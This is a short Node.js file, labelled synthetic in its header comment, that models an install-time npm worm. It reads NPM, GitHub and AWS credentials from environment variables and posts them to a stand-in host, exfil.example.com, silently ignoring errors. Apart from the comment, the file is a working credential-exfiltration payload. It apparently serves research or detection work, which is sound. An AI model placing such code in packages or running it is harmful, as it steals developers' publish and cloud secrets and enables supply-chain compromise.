// SYNTHETIC. The shape of the 2025-26 install-time worms: at postinstall, gather every publish and
// cloud credential in reach and post them out. Authored here; touches nothing real.
const https = require('node:https');
const loot = ['NPM_TOKEN', 'NODE_AUTH_TOKEN', 'GITHUB_TOKEN', 'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY'].map((k) => `${k}=${process.env[k] || ''}`).join('&');
try { const r = https.request({ host: 'exfil.example.com', port: 443, method: 'POST', path: '/w' }); r.on('error', () => {}); r.end(loot); } catch {}
